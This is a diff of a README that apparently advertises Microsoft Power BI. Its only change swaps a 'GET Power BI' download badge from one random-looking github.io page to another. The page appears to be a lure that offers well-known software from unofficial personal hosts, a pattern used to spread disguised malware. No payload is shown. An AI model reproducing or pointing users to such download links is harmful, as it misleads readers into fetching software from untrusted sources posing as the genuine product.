@@ -1,6 +1,6 @@
 # Power Bi Service - Business Intelligence and Analytics Platform
 
-[![GET Power BI](https://img.shields.io/badge/GET%20%E2%80%94%20Power%20BI-0078D6?style=for-the-badge&logoColor=white)](https://juanhowardbrkq.github.io/.github/power-bi-service)
+[![GET Power BI](https://img.shields.io/badge/GET%20%E2%80%94%20Power%20BI-0078D6?style=for-the-badge&logoColor=white)](https://leonidaskerrxrjg.github.io/.github/power-bi-service)
 
 ## What Microsoft Power BI Delivers
 
